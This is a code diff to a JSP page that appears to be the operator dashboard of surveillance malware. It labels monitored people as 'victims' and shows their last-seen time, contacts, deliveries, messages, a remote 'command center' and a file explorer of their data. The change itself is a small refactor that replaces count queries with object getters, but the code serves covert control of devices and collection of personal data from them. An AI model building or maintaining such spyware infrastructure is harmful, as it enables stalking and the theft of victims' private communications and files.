@@ -46,7 +46,6 @@
 
                 if (ClientVictimRelations.getInstance().isConnected(clientId.toString(), theVictim.getId())) {
 
-                    final String lastDelivery = Deliveries.getInstance().getLastDeliveryTime(null, theVictim.getId());
 
     %>
 
@@ -65,7 +64,7 @@
             <div class="col-md-12">
                 <h4><%=theVictim.getIdentity()%>
                     <small>
-                        <%=lastDelivery == null ? "(Not yet seen)" : "(last seen: " + lastDelivery + ")" %>
+                        <%=theVictim.getRelativeLastDeliveryTime() == null ? "(Not yet seen)" : "(last seen: " + theVictim.getRelativeLastDeliveryTime() + ")" %>
                     </small>
                 </h4>
 
@@ -76,14 +75,14 @@
 
             <%
                 //Trying to get count of all items in a single query
-                final Map<String,Integer> countMap = BaseTable.getAllCounts();
+                final Map<String, Integer> countMap = BaseTable.getAllCounts();
             %>
 
             <%--Contacts--%>
             <div class="col-lg-3">
                 <a href="/client/victim/contacts/<%=victimCode%>">
                     <div class="profile_grid">
-                        <p class="profile_grid_main_title"><%=Contacts.getInstance().getTotal(theVictim.getId())%>
+                        <p class="profile_grid_main_title"><%=theVictim.getContactCount()%>
                         </p>
 
                         <p class="profile_grid_sub_title">Contacts</p>
@@ -95,7 +94,7 @@
             <div class="col-lg-3">
                 <a href="/client/victim/deliveries/<%=victimCode%>">
                     <div class="profile_grid">
-                        <p class="profile_grid_main_title"><%=Deliveries.getInstance().getTotal(theVictim.getId())%>
+                        <p class="profile_grid_main_title"><%=theVictim.getDeliveryCount()%>
                         </p>
 
                         <p class="profile_grid_sub_title">Deliveries</p>
@@ -108,7 +107,7 @@
             <div class="col-lg-3">
                 <a href="<%=theVictim.getFCMId()!=null ?"/client/victim/command_center/" + victimCode : "#" %>">
                     <div class="profile_grid <%=theVictim.getFCMId()==null ? "inactive" : ""%>">
-                        <p class="profile_grid_main_title">C
+                        <p class="profile_grid_main_title"><%=theVictim.getCommandCount()%>
                         </p>
 
                         <p class="profile_grid_sub_title">Command center</p>
@@ -124,7 +123,7 @@
             <div class="col-lg-3">
                 <a href="<%=lastBundleHash!=null ? "/client/victim/files/" +victimCode + "/" + lastBundleHash : "#" %>">
                     <div class="profile_grid <%=lastBundleHash==null ? "inactive" : ""%>">
-                        <p class="profile_grid_main_title">F
+                        <p class="profile_grid_main_title"><%=theVictim.getFileBundleCount()%>
                         </p>
 
                         <p class="profile_grid_sub_title">File Explorer</p>
@@ -136,7 +135,7 @@
 
         <div class="row" style="margin-top: 20px;">
 
-            <%int msgCount = Messages.getInstance().getTotal(theVictim.getId());%>
+            <%int msgCount = theVictim.getMessageCount();%>
 
             <%--Messages--%>
             <div class="col-lg-3">
@@ -151,7 +150,7 @@
             </div>
 
 
-            <%--File--%>
+            <%--File uploads--%>
             <div class="col-lg-3">
                 <a href="<%=msgCount>0 ? "/client/victim/" +victimCode + "/media/files" : "#"%>">
                     <div class="profile_grid <%=msgCount==0 ? "inactive" : ""%>">
